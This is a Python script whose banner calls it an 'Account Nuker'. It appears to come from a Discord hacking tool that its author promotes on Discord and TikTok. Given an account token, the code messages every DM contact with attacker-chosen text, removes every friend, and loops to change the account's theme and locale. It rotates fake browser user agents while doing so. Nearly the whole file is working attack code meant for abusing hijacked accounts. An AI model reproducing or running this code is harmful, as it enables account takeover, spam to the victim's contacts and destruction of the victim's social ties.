import requests
from colorama import *
import random
from pystyle import *
import threading
import os
from itertools import cycle

################################################################

            # discord : uhq.s
            # tiktok  : https://tiktok.com/@paiementsecurise
            # serveur : https://discord.gg/wyUuYr9DEN
            # dev : uhq.s
            # owner : uhq.s

################################################################
green = Fore.GREEN
red = Fore.RED
magenta = Fore.MAGENTA
blue = Fore.BLUE
r = Fore.WHITE
lmagenta = Fore.LIGHTMAGENTA_EX
lred = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
lgreen = Fore.LIGHTGREEN_EX




heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

async def accnuker():
    os.system('cls')
    print(Colorate.Vertical(Colors.yellow_to_green,"""


     █████╗  ██████╗ ██████╗ ██████╗ ██╗   ██╗███╗   ██╗████████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
    ██╔══██╗██╔════╝██╔════╝██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ███████║██║     ██║     ██║   ██║██║   ██║██╔██╗ ██║   ██║       ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ██╔══██║██║     ██║     ██║   ██║██║   ██║██║╚██╗██║   ██║       ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║  ██║╚██████╗╚██████╗╚██████╔╝╚██████╔╝██║ ╚████║   ██║       ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                            


"""))
    token = input(lgreen + '[#] ACCOUNT TOKEN : ')
    message = input(yellow + '[#] MESSAGE : ')
    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            headers=headers,
            data={"content": f"{message}"})
            print(f"[ {Fore.LIGHTRED_EX}#{Fore.RESET} ] ID: "+channel['id'])
        except Exception as e:
            print(Fore.RED + f"[!] ERROR :  {e}")
    Write.Print(f"\n\nMessage envoyé à tous les amis\n", Colors.red_to_yellow, interval=0.009)

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Removed Friend: "+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"[!] ERROR :  {e}")
    Write.Print(f"\nTous les amis ont été supprimés\n", Colors.red_to_yellow, interval=0.009)

    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'ru'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
        user_input = input(yellow + "\n\nPRESS ENTER TO STOP")
        if user_input.lower() == "":
            t.do_run = False
            break